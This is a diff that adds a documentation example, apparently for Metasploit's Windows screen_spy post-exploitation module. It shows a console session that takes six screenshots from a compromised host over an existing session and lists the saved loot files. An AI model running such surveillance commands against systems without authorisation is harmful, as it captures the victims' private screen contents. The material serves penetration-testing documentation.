@@ -129,5 +129,55 @@ msf6 post(windows/gather/screen_spy) >
 
 ### Windows 10 20H2 (Database Connected, RECORD flag set)
 ```
+msf6 > use post/windows/gather/screen_spy
+msf6 post(windows/gather/screen_spy) > db_status
+[*] Connected to msf. Connection type: postgresql.
+msf6 post(windows/gather/screen_spy) > set SESSION 2
+SESSION => 2
+msf6 post(windows/gather/screen_spy) > show options
 
+Module options (post/windows/gather/screen_spy):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   COUNT             6                yes       Number of screenshots to collect
+   DELAY             5                yes       Interval between screenshots in seconds
+   PID                                no        PID to migrate into before taking the screenshots
+   RECORD            true             yes       Record all screenshots to disk by saving them to loot
+   SESSION           2                yes       The session to run this module on.
+   VIEW_SCREENSHOTS  false            no        View screenshots automatically
+
+msf6 post(windows/gather/screen_spy) > run
+
+[*] Capturing 6 screenshots with a delay of 5 seconds
+[*] Screen Spying Complete
+[*] run loot -t screenspy.screenshot to see file locations of your newly acquired loot
+[*] Post module execution completed
+msf6 post(windows/gather/screen_spy) > loot
+
+Loot
+====
+
+host            service  type                 name              content    info        path
+----            -------  ----                 ----              -------    ----        ----
+172.25.128.214           screenspy.screensho  screenshot.0.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135019_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_098
+                                                                                       612.jpg
+172.25.128.214           screenspy.screensho  screenshot.1.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135024_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_176
+                                                                                       753.jpg
+172.25.128.214           screenspy.screensho  screenshot.2.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135029_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_057
+                                                                                       554.jpg
+172.25.128.214           screenspy.screensho  screenshot.3.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135034_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_187
+                                                                                       603.jpg
+172.25.128.214           screenspy.screensho  screenshot.4.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135039_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_397
+                                                                                       543.jpg
+172.25.128.214           screenspy.screensho  screenshot.5.jpg  image/jpg  Screenshot  /home/gwillcox/.msf4/loot/20210412135044_d
+                         t                                                             efault_172.25.128.214_screenspy.screen_498
+                                                                                       562.jpg
+
+msf6 post(windows/gather/screen_spy) >
 ```
